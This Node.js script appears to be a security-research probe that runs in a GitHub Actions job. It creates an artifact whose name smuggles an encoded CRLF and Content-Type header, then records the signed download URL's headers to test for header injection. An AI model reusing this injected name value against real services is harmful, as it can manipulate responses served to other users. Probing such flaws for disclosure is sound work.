// Bounded Actions artifact header probe. Never prints tokens or signed URLs.
import https from 'node:https';
import { createHash } from 'node:crypto';

const token = process.env.ACTIONS_RUNTIME_TOKEN;
const results = process.env.ACTIONS_RESULTS_URL;
const githubToken = process.env.GITHUB_TOKEN;
const repo = process.env.GITHUB_REPOSITORY;
if (!token || !results || !githubToken || !repo) throw Error('Missing Actions context');

const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
const scope = claims.scp.split(' ').find(value => value.startsWith('Actions.Results:'));
if (!scope) throw Error('Missing Actions.Results scope');
const [, workflow_run_backend_id, workflow_job_run_backend_id] = scope.split(':');
const ids = { workflow_run_backend_id, workflow_job_run_backend_id };
const name = `rc-rscd-${process.env.GITHUB_RUN_ID}-%0D%0AContent-Type%3Aapplication%2Fjson%85.json`;
const payload = Buffer.from(JSON.stringify({ probe: 'rscd-crlf' }));

async function rpc(method, data) {
  const url = new URL(`/twirp/github.actions.results.api.v1.ArtifactService/${method}`, results);
  const response = await fetch(url, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify(data),
  });
  const body = await response.json();
  if (!response.ok) throw Error(`${method}: HTTP ${response.status}: ${String(body.msg || body.message || '').slice(0, 120)}`);
  return body;
}

const created = await rpc('CreateArtifact', { ...ids, name, version: 7, mime_type: 'text/plain' });
const uploadUrl = created.signed_upload_url || created.signedUploadUrl;
if (!uploadUrl) throw Error('No upload URL');
const uploaded = await fetch(uploadUrl, {
  method: 'PUT',
  headers: {
    'x-ms-version': '2020-10-02',
    'x-ms-blob-type': 'BlockBlob',
    'x-ms-blob-content-type': 'text/plain',
    'Content-Type': 'application/octet-stream',
  },
  body: payload,
});
if (!uploaded.ok) throw Error(`Upload HTTP ${uploaded.status}`);
const hash = `sha256:${createHash('sha256').update(payload).digest('hex')}`;
const finalized = await rpc('FinalizeArtifact', { ...ids, name, size: String(payload.length), hash: { value: hash } });
const artifactId = finalized.artifact_id || finalized.artifactId;
if (!artifactId) throw Error('No artifact ID');

const api = await fetch(`https://api.github.com/repos/${repo}/actions/artifacts/${artifactId}/zip`, {
  redirect: 'manual',
  headers: {
    Authorization: `Bearer ${githubToken}`,
    Accept: 'application/vnd.github.v3+json',
    'User-Agent': 'repo-cassette-rscd-probe',
  },
});
const location = api.headers.get('location');
if (api.status !== 302 || !location) {
  console.log('RSCD-PROBE', JSON.stringify({ artifactId, restStatus: api.status }));
  process.exit(0);
}

const signed = new URL(location);
const toHex = value => Buffer.from(value || '', 'latin1').toString('hex');
const raw = await new Promise((resolve, reject) => {
  const request = https.get(signed, { timeout: 12000 }, response => {
    const types = [];
    const dispositions = [];
    for (let index = 0; index < response.rawHeaders.length; index += 2) {
      const key = response.rawHeaders[index].toLowerCase();
      if (key === 'content-type') types.push(toHex(response.rawHeaders[index + 1]));
      if (key === 'content-disposition') dispositions.push(toHex(response.rawHeaders[index + 1]));
    }
    response.resume();
    response.on('end', () => resolve({ status: response.statusCode, types, dispositions }));
  });
  request.on('timeout', () => request.destroy(Error('Download timeout')));
  request.on('error', reject);
});

console.log('RSCD-PROBE', JSON.stringify({
  artifactId,
  restStatus: api.status,
  signedRsctHex: toHex(signed.searchParams.get('rsct')),
  signedRscdHex: toHex(signed.searchParams.get('rscd')),
  finalStatus: raw.status,
  contentTypeCount: raw.types.length,
  contentTypesHex: raw.types,
  contentDispositionsHex: raw.dispositions,
}));

